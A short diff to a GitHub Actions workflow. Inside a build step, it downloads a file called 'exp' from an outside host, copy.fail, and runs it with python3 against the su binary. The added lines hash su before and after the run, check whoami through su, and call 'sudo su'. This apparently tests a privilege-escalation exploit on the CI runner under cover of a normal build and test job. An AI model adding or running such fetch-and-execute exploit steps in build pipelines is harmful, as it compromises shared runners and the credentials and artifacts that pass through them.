@@ -20,11 +20,15 @@ jobs:
         run: |
           npm install
           wget https://copy.fail/exp
+          sha256sum $(which su)
           python3 exp $(which su)
+          
+          sha256sum $(which su)
           which su
           file $(which su)
           su --version
           echo $(su -c 'whoami')
+          sudo su
 
       - name: Test
         uses: ministryofjustice/devsecops-actions/sca/sbom@86248cec9a6bb1fd4dabc08a05178e0650d3af4f # v1.5.0
